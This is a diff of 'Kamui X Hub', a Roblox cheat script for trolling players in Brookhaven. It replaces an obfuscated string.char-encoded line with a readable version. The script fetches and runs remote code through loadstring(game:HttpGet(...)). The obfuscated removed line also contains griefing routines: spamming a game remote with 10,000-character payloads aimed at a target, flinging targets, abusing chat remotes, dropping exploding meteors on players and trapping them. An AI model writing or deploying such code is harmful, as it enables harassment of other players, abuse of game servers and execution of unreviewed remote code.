@@ -1,1 +1,546 @@
-local _a=string.char(118,49,46,54,46,50)local _b=loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,109,105,110,104,100,101,112,122,97,105,45,118,47,76,105,98,114,97,114,121,82,111,98,108,111,99,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,82,101,100,122,76,105,98,114,97,114,121,46,108,117,97)))()local _c=game:GetService(string.char(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101))local _d=game:GetService(string.char(80,108,97,121,101,114,115))local _e=game:GetService(string.char(82,117,110,83,101,114,118,105,99,101))local _f=workspace.CurrentCamera local _g=_d._g local _h=game:GetService(string.char(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101))local _i=game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101))local _j=game:GetService(string.char(86,105,114,116,117,97,108,73,110,112,117,116,77,97,110,97,103,101,114))_g:SetAttribute(string.char(75,97,109,117,105,72,117,98,85,115,101,114),true)local _k={string.char(116,101,115,116,101,101,101,101,101,101,101,101,112,111,117,114,97,97,95,57,57,51,57,49),string.char(116,101,115,116,101,95,111,102,99,57,48,57,56,55,54,52),string.char(116,101,115,116,101,95,111,102,99,57,48),string.char(84,76,75,95,69,68,73,84,83)}local _l={7217546593}local _m=string.char(116,101,115,116,101,95,111,102,99,57,48)local _n=string.char(49,48,53,56,49,55,49,49,48,53,53)local _o=1050 local function _p(_q)for _r,_s in ipairs(_k)do if _q.Name==_s or _q.DisplayName==_s then return true end end for _r,_t in ipairs(_l)do if _q.UserId==_t then return true end end return false end local function _u(_q)if not _q then return false,string.char(78,101,110,104,117,109,32,106,111,103,97,100,111,114,32,115,101,108,101,99,105,111,110,97,100,111)end if _q:GetAttribute(string.char(75,97,109,117,105,72,117,98,85,115,101,114))~=true then return false,_q.Name..string.char(32,110,227,111,32,101,115,116,225,32,117,115,97,110,100,111,32,111,32,104,117,98)end return true,nil end local _v=false pcall(function()writefile(string.char(107,97,109,117,105,95,97,112,105,95,116,101,115,116,46,116,109,112),string.char(111,107))local _w=readfile(string.char(107,97,109,117,105,95,97,112,105,95,116,101,115,116,46,116,109,112))local _x=isfile(string.char(107,97,109,117,105,95,97,112,105,95,116,101,115,116,46,116,109,112))pcall(function()delfile(string.char(107,97,109,117,105,95,97,112,105,95,116,101,115,116,46,116,109,112))end)if _w==string.char(111,107)and _x==true then _v=true end end)local _y={}local function _z(_A)return _y[_A]==true end local _B={_ab={_Y=string.char(75,97,109,117,105,32,120,32,104,117,98,32,40).._a..string.char(41),sub=string.char(66,114,111,111,107,104,97,118,101,110,32,84,114,111,108,108,32,43,32,71,97,109,101,112,97,115,115,32,43,32,69,120,116,114,97,115),credits=string.char(67,114,233,100,105,116,111,115),creator=string.char(67,114,105,97,100,111,114),creatorName=string.char(116,101,115,116,101,101,101,101,101,101,101,101,112,111,117,114,97,97,95,57,57,51,57,49),discord=string.char(69,110,116,114,101,32,110,111,32,110,111,115,115,111,32,115,101,114,118,105,100,111,114,32,68,105,115,99,111,114,100),troll=string.char(84,114,111,108,108),_za=string.char(65,108,118,111),targetDesc=string.char(83,101,108,101,99,105,111,110,101,32,111,32,106,111,103,97,100,111,114,32,40,111,117,32,65,108,108,41),loading=string.char(67,97,114,114,101,103,97,110,100,111,46,46,46),noPlayers=string.char(78,101,110,104,117,109,32,106,111,103,97,100,111,114),all=string.char(65,108,108),refresh=string.char(65,116,117,97,108,105,122,97,114),view=string.char(86,105,101,119,32,65,108,118,111),tp=string.char(84,101,108,101,112,111,114,116,97,114),fling=string.char(70,108,105,110,103),method=string.char(77,233,116,111,100,111),execFling=string.char(69,120,101,99,117,116,97,114,32,70,108,105,110,103),touchFling=string.char(84,111,117,99,104,32,70,108,105,110,103,32,98,97,108,108),wlSection=string.char(87,72,73,84,69,76,73,83,84,32,8212,32,80,114,111,116,101,231,227,111,32,99,111,110,116,114,97,32,70,108,105,110,103),wlAdd=string.char(65,100,105,99,105,111,110,97,114,32,47,32,82,101,109,111,118,101,114),wlClear=string.char(82,101,109,111,118,101,114,32,84,111,100,111,115,32,100,97,32,87,104,105,116,101,108,105,115,116),item=string.char(73,116,101,109),itemPaid=string.char(73,116,101,109,32,80,97,103,111),itemGet=string.char(80,101,103,97,114,32,73,116,101,109),musicTab=string.char(77,250,115,105,99,97),musicId=string.char(73,68,32,100,97,32,109,250,115,105,99,97,32,40,101,120,58,32,49,57,55,54,55,56,54,50,57,57,41),musicSend=string.char(84,111,99,97,114,32,77,250,115,105,99,97),musicSaved=string.char(77,250,115,105,99,97,115,32,83,97,108,118,97,115),musicSaveName=string.char(78,111,109,101),musicSave=string.char(83,97,108,118,97,114),musicDel=string.char(68,101,108,101,116,97,114),musicPlay=string.char(84,111,99,97,114,32,83,97,108,118,97),musicNone=string.char(78,101,110,104,117,109,97,32,115,97,108,118,97),musicAll=string.char(77,250,115,105,99,97,32,65,108,108),musicAllSoon=string.char(69,77,32,66,82,69,86,69),extras=string.char(69,120,116,114,97,115),autoRejoin=string.char(65,117,116,111,32,82,101,106,111,105,110),prot=string.char(80,114,111,116,101,231,227,111),antiSit=string.char(65,110,116,105,32,83,105,116),noclip=string.char(78,111,99,108,105,112),antiVoid=string.char(65,110,116,105,32,86,111,105,100),antiFling=string.char(65,110,116,105,45,70,108,105,110,103),avatar=string.char(65,118,97,116,97,114),copyAvatar=string.char(67,111,112,121,32,65,118,97,116,97,114),avatarTarget=string.char(83,101,108,101,99,105,111,110,97,114,32,74,111,103,97,100,111,114),refreshList=string.char(65,116,117,97,108,105,122,97,114,32,76,105,115,116,97),admin=string.char(65,100,109,105,110),adminWarn=string.char(65,99,101,115,115,111,32,82,101,115,116,114,105,116,111),adminBtn=string.char(69,120,101,99,117,116,97,114,32,65,100,109,105,110,32,72,117,98),protectedNotif=string.char(101,115,116,225,32,112,114,111,116,101,103,105,100,111)},en={_Y=string.char(75,97,109,117,105,32,120,32,104,117,98,32,40).._a..string.char(41),sub=string.char(66,114,111,111,107,104,97,118,101,110,32,84,114,111,108,108,32,43,32,71,97,109,101,112,97,115,115,32,43,32,69,120,116,114,97,115),credits=string.char(67,114,101,100,105,116,115),creator=string.char(67,114,101,97,116,111,114),creatorName=string.char(116,101,115,116,101,101,101,101,101,101,101,101,112,111,117,114,97,97,95,57,57,51,57,49),discord=string.char(74,111,105,110,32,111,117,114,32,68,105,115,99,111,114,100,32,115,101,114,118,101,114),troll=string.char(84,114,111,108,108),_za=string.char(84,97,114,103,101,116),targetDesc=string.char(83,101,108,101,99,116,32,112,108,97,121,101,114,32,40,111,114,32,65,108,108,41),loading=string.char(76,111,97,100,105,110,103,46,46,46),noPlayers=string.char(78,111,32,112,108,97,121,101,114,115),all=string.char(65,108,108),refresh=string.char(82,101,102,114,101,115,104),view=string.char(86,105,101,119,32,84,97,114,103,101,116),tp=string.char(84,101,108,101,112,111,114,116),fling=string.char(70,108,105,110,103),method=string.char(77,101,116,104,111,100),execFling=string.char(69,120,101,99,117,116,101,32,70,108,105,110,103),touchFling=string.char(84,111,117,99,104,32,70,108,105,110,103,32,98,97,108,108),wlSection=string.char(87,72,73,84,69,76,73,83,84,32,8212,32,70,108,105,110,103,32,80,114,111,116,101,99,116,105,111,110),wlAdd=string.char(65,100,100,32,47,32,82,101,109,111,118,101),wlClear=string.char(82,101,109,111,118,101,32,65,108,108,32,102,114,111,109,32,87,104,105,116,101,108,105,115,116),item=string.char(73,116,101,109),itemPaid=string.char(80,97,105,100,32,73,116,101,109),itemGet=string.char(71,101,116,32,73,116,101,109),musicTab=string.char(77,117,115,105,99),musicId=string.char(77,117,115,105,99,32,73,68,32,40,101,120,58,32,49,57,55,54,55,56,54,50,57,57,41),musicSend=string.char(80,108,97,121,32,77,117,115,105,99),musicSaved=string.char(83,97,118,101,100,32,83,111,110,103,115),musicSaveName=string.char(78,97,109,101),musicSave=string.char(83,97,118,101),musicDel=string.char(68,101,108,101,116,101),musicPlay=string.char(80,108,97,121,32,83,97,118,101,100),musicNone=string.char(78,111,32,115,97,118,101,100,32,115,111,110,103,115),musicAll=string.char(77,117,115,105,99,32,65,108,108),musicAllSoon=string.char(67,79,77,73,78,71,32,83,79,79,78),extras=string.char(69,120,116,114,97,115),autoRejoin=string.char(65,117,116,111,32,82,101,106,111,105,110),prot=string.char(80,114,111,116,101,99,116,105,111,110),antiSit=string.char(65,110,116,105,32,83,105,116),noclip=string.char(78,111,99,108,105,112),antiVoid=string.char(65,110,116,105,32,86,111,105,100),antiFling=string.char(65,110,116,105,45,70,108,105,110,103),avatar=string.char(65,118,97,116,97,114),copyAvatar=string.char(67,111,112,121,32,65,118,97,116,97,114),avatarTarget=string.char(83,101,108,101,99,116,32,80,108,97,121,101,114),refreshList=string.char(82,101,102,114,101,115,104,32,76,105,115,116),admin=string.char(65,100,109,105,110),adminWarn=string.char(82,101,115,116,114,105,99,116,101,100,32,65,99,99,101,115,115),adminBtn=string.char(69,120,101,99,117,116,101,32,65,100,109,105,110,32,72,117,98),protectedNotif=string.char(105,115,32,112,114,111,116,101,99,116,101,100)}}local _C=string.char(107,97,109,117,105,95,115,97,118,101,100,95,109,117,115,105,99,46,106,115,111,110)local _D={}if _v then pcall(function()if isfile(_C)then local _E=readfile(_C)if _E and _E~=""then local _F=_i:JSONDecode(_E)if type(_F)==string.char(116,97,98,108,101)then for _H,_I in pairs(_F)do local _J=tostring(_I):match(string.char(40,37,100,43,41))if _J then _D[_H]=_J end end end end end end)end local function _K()if not _v then return end pcall(function()writefile(_C,_i:JSONEncode(_D))end)end local function _L(_t)if not _t then return nil end _t=tostring(_t):gsub(string.char(37,115,43),"")return _t:match(string.char(40,37,100,43,41))end local _M=nil local _N=nil local _O=0 local function _P()if _M and _M.Parent then return _M end local _Q=_g:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))local _R=_Q:FindFirstChild(string.char(75,97,109,117,105,78,111,116,105,102,71,117,105))if _R then _R:Destroy()end _R=Instance.new(string.char(83,99,114,101,101,110,71,117,105))_R.Name=string.char(75,97,109,117,105,78,111,116,105,102,71,117,105)_R.Parent=_Q _R.ResetOnSpawn=false _R.IgnoreGuiInset=true _R.DisplayOrder=999 _M=_R local _S=Instance.new(string.char(70,114,97,109,101))_S.Name=string.char(78,111,116,105,102,67,111,110,116,97,105,110,101,114)_S.AnchorPoint=Vector2.new(0.5,0)_S.Position=UDim2.new(0.5,0,0.05,0)_S.Size=UDim2.new(0.6,0,0,0)_S.BackgroundTransparency=1 _S.Parent=_R local _T=Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116))_T.SortOrder=Enum.SortOrder.LayoutOrder _T.Padding=UDim.new(0,6)_T.Parent=_S _N=_S return _R end local function _U(_V,_W)pcall(function()_P()_O=_O+1 local _X=Instance.new(string.char(70,114,97,109,101))_X.LayoutOrder=_O _X.Size=UDim2.new(1,0,0,45)_X.BackgroundColor3=Color3.fromRGB(20,20,20)_X.BackgroundTransparency=0.1 _X.BorderSizePixel=2 _X.BorderColor3=_W or Color3.fromRGB(0,255,0)_X.Parent=_N local _Y=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_Y.Size=UDim2.new(1,0,0,22)_Y.BackgroundTransparency=1 _Y.Text=string.char(75,97,109,117,105,32,72,117,98)_Y.TextColor3=_W or Color3.fromRGB(0,255,0)_Y.TextScaled=true _Y.Font=Enum.Font.SourceSansBold _Y.TextXAlignment=Enum.TextXAlignment.Left _Y.Parent=_X local _Z=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_Z.Position=UDim2.new(0,0,0,22)_Z.Size=UDim2.new(1,0,0,23)_Z.BackgroundTransparency=1 _Z.Text=_V _Z.TextColor3=Color3.fromRGB(255,255,255)_Z.TextScaled=true _Z.Font=Enum.Font.SourceSans _Z.TextXAlignment=Enum.TextXAlignment.Left _Z.Parent=_X task.delay(5,function()if _X and _X.Parent then _X:Destroy()end end)end)end local function _aa(_V)_U(_V,Color3.fromRGB(0,255,0))end local function _ba(_V)_U(_V,Color3.fromRGB(255,80,80))end local function _ca(_V)_U(_V,Color3.fromRGB(0,200,255))end local function _da(_ea)if not _ea then return nil end for _r,_fa in ipairs({function()return _ea.Text end,function()return _ea:GetText()end,function()return _ea:Get()end,function()return _ea.Value end})do local _ga,_I=pcall(_fa)if _ga and type(_I)==string.char(115,116,114,105,110,103)and _I~=""then return _I end end return nil end local function _ha(_q)if not _q or _q==_g then return end if not _p(_g)then return end if _q:GetAttribute(string.char(75,97,109,117,105,72,117,98,85,115,101,114))~=true then return end local _ia=_q.Character if not _ia then return end local _ja=_ia:FindFirstChild(string.char(72,101,97,100))if not _ja then return end local _ka=_ja:FindFirstChild(string.char(75,97,109,117,105,84,97,103))if _ka then _ka:Destroy()end local _la=_p(_q)local _ma=Instance.new(string.char(66,105,108,108,98,111,97,114,100,71,117,105))_ma.Name=string.char(75,97,109,117,105,84,97,103)_ma.Size=UDim2.new(0,120,0,25)_ma.StudsOffset=Vector3.new(0,2.5,0)_ma.AlwaysOnTop=true _ma.Parent=_ja local _na=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_na.Size=UDim2.new(1,0,1,0)_na.BackgroundColor3=_la and Color3.fromRGB(255,0,0)or Color3.fromRGB(0,255,0)_na.BackgroundTransparency=0.2 _na.BorderSizePixel=0 _na.Text=_la andstring.char(91,65,68,77,73,78,93)orstring.char(91,85,83,85,193,82,73,79,93)_na.TextColor3=Color3.new(1,1,1)_na.TextScaled=true _na.Font=Enum.Font.SourceSansBold _na.Parent=_ma end local function _oa()if not _p(_g)then return end for _r,_pa in ipairs(_d:GetPlayers())do if _pa~=_g then _ha(_pa)end end _d.PlayerAdded:Connect(function(_pa)_pa.CharacterAdded:Connect(function()task.wait(1.5)_ha(_pa)end)task.wait(2)_ha(_pa)end)end local _qa=false local function _ra(_sa)local _ta=Instance.new(string.char(80,97,114,116))_ta.Name=string.char(75,97,109,117,105,77,101,116,101,111,114)_ta.Shape=Enum.PartType.Ball _ta.Size=Vector3.new(8,8,8)_ta.Material=Enum.Material.Neon _ta.BrickColor=BrickColor.new(string.char(82,101,97,108,108,121,32,114,101,100))_ta.CanCollide=true _ta.Position=Vector3.new(_sa.X+math.random(-200,200),_sa.Y+400,_sa.Z+math.random(-200,200))_ta.Parent=workspace local _ua=Instance.new(string.char(70,105,114,101))_ua.Heat=50 _ua.Size=20 _ua.Parent=_ta local _va=Instance.new(string.char(80,111,105,110,116,76,105,103,104,116))_va.Brightness=5 _va.Range=40 _va.Color=Color3.fromRGB(255,100,0)_va.Parent=_ta local _wa=Instance.new(string.char(66,111,100,121,86,101,108,111,99,105,116,121))_wa.Velocity=Vector3.new(math.random(-50,50),-300,math.random(-50,50))_wa.MaxForce=Vector3.new(math.huge,math.huge,math.huge)_wa.Parent=_ta task.delay(8,function()if _ta and _ta.Parent then _ta:Destroy()end end)_ta.Touched:Connect(function()if _ta:GetAttribute(string.char(69,120,112,108,111,100,101,100))then return end _ta:SetAttribute(string.char(69,120,112,108,111,100,101,100),true)local _xa=Instance.new(string.char(69,120,112,108,111,115,105,111,110))_xa.Position=_ta.Position _xa.BlastRadius=20 _xa.BlastPressure=50000 _xa.Parent=workspace if _ta.Parent then _ta:Destroy()end end)end local function _ya(_za)if _qa then return end _qa=true task.spawn(function()while _qa do local _Aa if _za and _za.Character then local _Ba=_za.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if _Ba then _Aa=_Ba.Position end end if not _Aa then _Aa=Vector3.new(math.random(-300,300),100,math.random(-300,300))end _ra(_Aa)task.wait(0.5)end end)end local function _Ca()_qa=false for _r,_Da in ipairs(workspace:GetChildren())do if _Da.Name==string.char(75,97,109,117,105,77,101,116,101,111,114)then _Da:Destroy()end end end local function _Ea(_za)if not _za then return end local _Fa=_c:FindFirstChild(string.char(82,69))if not _Fa then return end task.spawn(function()for _Ga=1,500 do local _w=_Fa:FindFirstChild(string.char(49,80,108,97,121,101,49,114,84,114,105,103,103,101,49,114,69,118,101,110,49,116))if _w then pcall(function()_w:FireServer(string.rep(string.char(65),10000),_za,string.rep(string.char(66),10000))end)end if _Ga%50==0 then task.wait()end end end)task.spawn(function()for _Ga=1,200 do if _za.Character then local _Ba=_za.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if _Ba then _Ba.CFrame=CFrame.new(math.random(-10000,10000),math.random(-10000,10000),math.random(-10000,10000))end end task.wait(0.01)end end)end local function _Ha(_za,_Ia)if not _za or not _Ia or _Ia==""then return end local _Fa=_c:FindFirstChild(string.char(82,69))if not _Fa then return end for _r,_Ja in ipairs({string.char(49,67,104,97,49,116),string.char(49,67,104,97,49,116,69,118,101,110,49,116),string.char(49,83,101,49,110,100,77,101,115,49,115,97,103,101),string.char(49,77,101,115,49,115,97,103,101),string.char(49,82,80,67,104,97,49,116)})do local _w=_Fa:FindFirstChild(_Ja)if _w then pcall(function()_w:FireServer(_Ia,_za)end)pcall(function()_w:FireServer(_za,_Ia)end)end end end local function _Ka()local _La=workspace:FindFirstChild(string.char(75,97,109,117,105,66,97,99,107,114,111,111,109,115))if _La then _La:Destroy()end local _Ma=Instance.new(string.char(70,111,108,100,101,114))_Ma.Name=string.char(75,97,109,117,105,66,97,99,107,114,111,111,109,115)_Ma.Parent=workspace local _Na=Vector3.new(0,_o,0)local _Oa=200 local _Pa=20 local _Qa=Instance.new(string.char(80,97,114,116))_Qa.Name=string.char(70,108,111,111,114)_Qa.Size=Vector3.new(_Oa,2,_Oa)_Qa.Position=_Na _Qa.Anchored=true _Qa.BrickColor=BrickColor.new(string.char(78,101,119,32,89,101,108,108,101,114))_Qa.Material=Enum.Material.Concrete _Qa.Parent=_Ma local _Ra=Instance.new(string.char(80,97,114,116))_Ra.Name=string.char(67,101,105,108,105,110,103)_Ra.Size=Vector3.new(_Oa,2,_Oa)_Ra.Position=_Na+Vector3.new(0,_Pa,0)_Ra.Anchored=true _Ra.BrickColor=BrickColor.new(string.char(78,101,119,32,89,101,108,108,101,114))_Ra.Material=Enum.Material.Concrete _Ra.Parent=_Ma for _Ga,_Sa in ipairs({{Vector3.new(_Oa,_Pa,2),_Na+Vector3.new(0,_Pa/2,_Oa/2)},{Vector3.new(_Oa,_Pa,2),_Na+Vector3.new(0,_Pa/2,-_Oa/2)},{Vector3.new(2,_Pa,_Oa),_Na+Vector3.new(_Oa/2,_Pa/2,0)},{Vector3.new(2,_Pa,_Oa),_Na+Vector3.new(-_Oa/2,_Pa/2,0)}})do local _Ta=Instance.new(string.char(80,97,114,116))_Ta.Name=string.char(87,97,108,108).._Ga _Ta.Size=_Sa[1]_Ta.Position=_Sa[2]_Ta.Anchored=true _Ta.BrickColor=BrickColor.new(string.char(78,101,119,32,89,101,108,108,101,114))_Ta.Material=Enum.Material.Concrete _Ta.Parent=_Ma end for _Ga=1,5 do local _Ua=Instance.new(string.char(80,97,114,116))_Ua.Name=string.char(76,105,103,104,116).._Ga _Ua.Size=Vector3.new(8,0.5,2)_Ua.Position=_Na+Vector3.new(math.random(-80,80),_Pa-1,math.random(-80,80))_Ua.Anchored=true _Ua.CanCollide=false _Ua.Material=Enum.Material.Neon _Ua.BrickColor=BrickColor.new(string.char(84,111,111,116,104,112,97,115,116,101))_Ua.Parent=_Ma local _Va=Instance.new(string.char(80,111,105,110,116,76,105,103,104,116))_Va.Brightness=3 _Va.Range=80 _Va.Color=Color3.fromRGB(255,250,200)_Va.Parent=_Ua end end local function _Wa(_q)if not _q or not _q.Character then return end local _Ba=_q.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if _Ba then _Ba.CFrame=CFrame.new(0,_o+5,0)end end local function _Xa()local _Q=_g:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))local _ka=_Q:FindFirstChild(string.char(75,97,109,117,105,76,97,110,103,117,97,103,101,83,99,114,101,101,110))if _ka then _ka:Destroy()end local _Ya=Instance.new(string.char(83,99,114,101,101,110,71,117,105))_Ya.Name=string.char(75,97,109,117,105,76,97,110,103,117,97,103,101,83,99,114,101,101,110)_Ya.Parent=_Q _Ya.ResetOnSpawn=false _Ya.IgnoreGuiInset=true local _Za=Instance.new(string.char(70,114,97,109,101))_Za.Parent=_Ya _Za.AnchorPoint=Vector2.new(0.5,0.5)_Za.Position=UDim2.new(0.5,0,0.5,0)_Za.Size=UDim2.new(1,0,1,0)_Za.BackgroundColor3=Color3.new(0,0,0)_Za.BorderSizePixel=0 local _Y=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_Y.Parent=
+-- ============================================================
+-- KAMUI X HUB v1.6.2
+-- proteção kamui x hub
+-- ============================================================
+local VERSION = "v1.6.2"
+
+local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/minhdepzai-v/LibraryRobloc/refs/heads/main/RedzLibrary.lua"))()
+
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Camera = workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+
+LocalPlayer:SetAttribute("KamuiHubUser", true)
+
+local ADMIN_WHITELIST_NAMES = { "testeeeeeeeepouraa_99391", "teste_ofc9098764", "teste_ofc90", "TLK_EDITS" }
+local ADMIN_WHITELIST_IDS = { 7217546593 }
+local PLAYERS_TAB_ALLOWED = "teste_ofc90"
+local BACKROOMS_ID = "10581711055"
+local BACKROOMS_Y = 1050
+
+local function isAdminAuthorized(player)
+    for _, n in ipairs(ADMIN_WHITELIST_NAMES) do
+        if player.Name == n or player.DisplayName == n then return true end
+    end
+    for _, id in ipairs(ADMIN_WHITELIST_IDS) do
+        if player.UserId == id then return true end
+    end
+    return false
+end
+
+local function requireHubUser(player)
+    if not player then return false, "Nenhum jogador selecionado" end
+    if player:GetAttribute("KamuiHubUser") ~= true then
+        return false, player.Name .. " não está usando o hub"
+    end
+    return true, nil
+end
+
+local FILE_API_OK = false
+pcall(function()
+    writefile("kamui_api_test.tmp", "ok")
+    local r = readfile("kamui_api_test.tmp")
+    local e = isfile("kamui_api_test.tmp")
+    pcall(function() delfile("kamui_api_test.tmp") end)
+    if r == "ok" and e == true then FILE_API_OK = true end
+end)
+
+local protectedPlayers = {}
+local function isProtected(name) return protectedPlayers[name] == true end
+
+-- ============================================================
+-- TRADUÇÕES
+-- ============================================================
+local T = {
+    pt = {
+        title = "Kamui x hub (" .. VERSION .. ")",
+        sub = "Brookhaven Troll + Gamepass + Extras",
+        credits = "Créditos",
+        creator = "Criador",
+        creatorName = "testeeeeeeeepouraa_99391",
+        discord = "Entre no nosso servidor Discord",
+        troll = "Troll",
+        target = "Alvo",
+        targetDesc = "Selecione o jogador (ou All)",
+        loading = "Carregando...",
+        noPlayers = "Nenhum jogador",
+        all = "All",
+        refresh = "Atualizar",
+        view = "View Alvo",
+        tp = "Teleportar",
+        fling = "Fling",
+        method = "Método",
+        execFling = "Executar Fling",
+        touchFling = "Touch Fling ball",
+        wlSection = "WHITELIST — Proteção contra Fling",
+        wlAdd = "Adicionar / Remover",
+        wlClear = "Remover Todos da Whitelist",
+        item = "Item",
+        itemPaid = "Item Pago",
+        itemGet = "Pegar Item",
+        musicTab = "Música",
+        musicId = "ID da música (ex: 1976786299)",
+        musicSend = "Tocar Música",
+        musicSaved = "Músicas Salvas",
+        musicSaveName = "Nome",
+        musicSave = "Salvar",
+        musicDel = "Deletar",
+        musicPlay = "Tocar Salva",
+        musicNone = "Nenhuma salva",
+        musicAll = "Música All",
+        musicAllSoon = "EM BREVE",
+        extras = "Extras",
+        autoRejoin = "Auto Rejoin",
+        prot = "Proteção",
+        antiSit = "Anti Sit",
+        noclip = "Noclip",
+        antiVoid = "Anti Void",
+        antiFling = "Anti-Fling",
+        avatar = "Avatar",
+        copyAvatar = "Copy Avatar",
+        avatarTarget = "Selecionar Jogador",
+        refreshList = "Atualizar Lista",
+        admin = "Admin",
+        adminWarn = "Acesso Restrito",
+        adminBtn = "Executar Admin Hub",
+        protectedNotif = "está protegido"
+    },
+    en = {
+        title = "Kamui x hub (" .. VERSION .. ")",
+        sub = "Brookhaven Troll + Gamepass + Extras",
+        credits = "Credits",
+        creator = "Creator",
+        creatorName = "testeeeeeeeepouraa_99391",
+        discord = "Join our Discord server",
+        troll = "Troll",
+        target = "Target",
+        targetDesc = "Select player (or All)",
+        loading = "Loading...",
+        noPlayers = "No players",
+        all = "All",
+        refresh = "Refresh",
+        view = "View Target",
+        tp = "Teleport",
+        fling = "Fling",
+        method = "Method",
+        execFling = "Execute Fling",
+        touchFling = "Touch Fling ball",
+        wlSection = "WHITELIST — Fling Protection",
+        wlAdd = "Add / Remove",
+        wlClear = "Remove All from Whitelist",
+        item = "Item",
+        itemPaid = "Paid Item",
+        itemGet = "Get Item",
+        musicTab = "Music",
+        musicId = "Music ID (ex: 1976786299)",
+        musicSend = "Play Music",
+        musicSaved = "Saved Songs",
+        musicSaveName = "Name",
+        musicSave = "Save",
+        musicDel = "Delete",
+        musicPlay = "Play Saved",
+        musicNone = "No saved songs",
+        musicAll = "Music All",
+        musicAllSoon = "COMING SOON",
+        extras = "Extras",
+        autoRejoin = "Auto Rejoin",
+        prot = "Protection",
+        antiSit = "Anti Sit",
+        noclip = "Noclip",
+        antiVoid = "Anti Void",
+        antiFling = "Anti-Fling",
+        avatar = "Avatar",
+        copyAvatar = "Copy Avatar",
+        avatarTarget = "Select Player",
+        refreshList = "Refresh List",
+        admin = "Admin",
+        adminWarn = "Restricted Access",
+        adminBtn = "Execute Admin Hub",
+        protectedNotif = "is protected"
+    }
+}
+
+-- ============================================================
+-- PERSISTÊNCIA DE MÚSICA
+-- ============================================================
+local MUSIC_FILE = "kamui_saved_music.json"
+local savedMusic = {}
+if FILE_API_OK then
+    pcall(function()
+        if isfile(MUSIC_FILE) then
+            local raw = readfile(MUSIC_FILE)
+            if raw and raw ~= "" then
+                local data = HttpService:JSONDecode(raw)
+                if type(data) == "table" then
+                    for k, v in pairs(data) do
+                        local clean = tostring(v):match("(%d+)")
+                        if clean then savedMusic[k] = clean end
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local function persistMusic()
+    if not FILE_API_OK then return end
+    pcall(function() writefile(MUSIC_FILE, HttpService:JSONEncode(savedMusic)) end)
+end
+
+local function normalizeId(id)
+    if not id then return nil end
+    id = tostring(id):gsub("%s+", "")
+    return id:match("(%d+)")
+end
+
+-- ============================================================
+-- SISTEMA DE NOTIFICAÇÃO PERSISTENTE
+-- ============================================================
+local notifGui = nil
+local notifContainer = nil
+local notifOrder = 0
+
+local function ensureNotifGui()
+    if notifGui and notifGui.Parent then return notifGui end
+    local pg = LocalPlayer:WaitForChild("PlayerGui")
+    local s = pg:FindFirstChild("KamuiNotifGui")
+    if s then s:Destroy() end
+    s = Instance.new("ScreenGui")
+    s.Name = "KamuiNotifGui"
+    s.Parent = pg
+    s.ResetOnSpawn = false
+    s.IgnoreGuiInset = true
+    s.DisplayOrder = 999
+    notifGui = s
+    local c = Instance.new("Frame")
+    c.Name = "NotifContainer"
+    c.AnchorPoint = Vector2.new(0.5, 0)
+    c.Position = UDim2.new(0.5, 0, 0.05, 0)
+    c.Size = UDim2.new(0.6, 0, 0, 0)
+    c.BackgroundTransparency = 1
+    c.Parent = s
+    local l = Instance.new("UIListLayout")
+    l.SortOrder = Enum.SortOrder.LayoutOrder
+    l.Padding = UDim.new(0, 6)
+    l.Parent = c
+    notifContainer = c
+    return s
+end
+
+local function showNotif(text, color)
+    pcall(function()
+        ensureNotifGui()
+        notifOrder = notifOrder + 1
+        local frame = Instance.new("Frame")
+        frame.LayoutOrder = notifOrder
+        frame.Size = UDim2.new(1, 0, 0, 45)
+        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        frame.BackgroundTransparency = 0.1
+        frame.BorderSizePixel = 2
+        frame.BorderColor3 = color or Color3.fromRGB(0, 255, 0)
+        frame.Parent = notifContainer
+        local title = Instance.new("TextLabel")
+        title.Size = UDim2.new(1, 0, 0, 22)
+        title.BackgroundTransparency = 1
+        title.Text = "Kamui Hub"
+        title.TextColor3 = color or Color3.fromRGB(0, 255, 0)
+        title.TextScaled = true
+        title.Font = Enum.Font.SourceSansBold
+        title.TextXAlignment = Enum.TextXAlignment.Left
+        title.Parent = frame
+        local content = Instance.new("TextLabel")
+        content.Position = UDim2.new(0, 0, 0, 22)
+        content.Size = UDim2.new(1, 0, 0, 23)
+        content.BackgroundTransparency = 1
+        content.Text = text
+        content.TextColor3 = Color3.fromRGB(255, 255, 255)
+        content.TextScaled = true
+        content.Font = Enum.Font.SourceSans
+        content.TextXAlignment = Enum.TextXAlignment.Left
+        content.Parent = frame
+        task.delay(5, function()
+            if frame and frame.Parent then frame:Destroy() end
+        end)
+    end)
+end
+
+local function notifySuccess(text) showNotif(text, Color3.fromRGB(0, 255, 0)) end
+local function notifyError(text) showNotif(text, Color3.fromRGB(255, 80, 80)) end
+local function notifyInfo(text) showNotif(text, Color3.fromRGB(0, 200, 255)) end
+
+-- ============================================================
+-- LEITOR DE TEXTBOX
+-- ============================================================
+local function readTextBox(tb)
+    if not tb then return nil end
+    for _, m in ipairs({
+        function() return tb.Text end,
+        function() return tb:GetText() end,
+        function() return tb:Get() end,
+        function() return tb.Value end
+    }) do
+        local ok, v = pcall(m)
+        if ok and type(v) == "string" and v ~= "" then return v end
+    end
+    return nil
+end
+
+-- ============================================================
